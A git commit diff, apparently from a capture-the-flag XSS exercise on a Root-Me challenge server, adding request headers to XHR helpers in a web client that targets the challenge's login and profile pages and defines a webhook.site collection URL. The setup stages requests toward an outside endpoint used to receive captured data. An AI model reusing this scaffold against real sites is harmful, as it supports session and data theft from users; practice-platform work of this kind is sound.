21675280728fd5eb5ba7ecb9fe161274dd5c5ce2
Timothy Didierjean <timothy.didierjean@epita.fr>
2025-05-28 16:32:26 +0200

    xss

--- web-client/index.js
+++ web-client/index.js
@@ -1,5 +1,4 @@
-// https://tim-xd.github.io/web-client/index.html
-
+const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
 const LOGIN = "http://challenge01.root-me.org:58003/login";
 const PROFILE = "http://challenge01.root-me.org:58003/profile";
 const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";
@@ -7,12 +6,16 @@ const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";
 function get(url) {
   let xhr = new XMLHttpRequest();
   xhr.open("GET", url, false);
+  xhr.setRequestHeader("Access-Control-Allow-Origin", ORIGIN);
+  xhr.setRequestHeader("Access-Control-Allow-Methods", "GET, POST");
   return xhr.send(null);
 }
 
 function post(url, data) {
   let xhr = new XMLHttpRequest();
   xhr.open("POST", url, false);
+  xhr.setRequestHeader("Access-Control-Allow-Origin", ORIGIN);
+  xhr.setRequestHeader("Access-Control-Allow-Methods", "GET, POST");
   return xhr.send(data);
 }
 
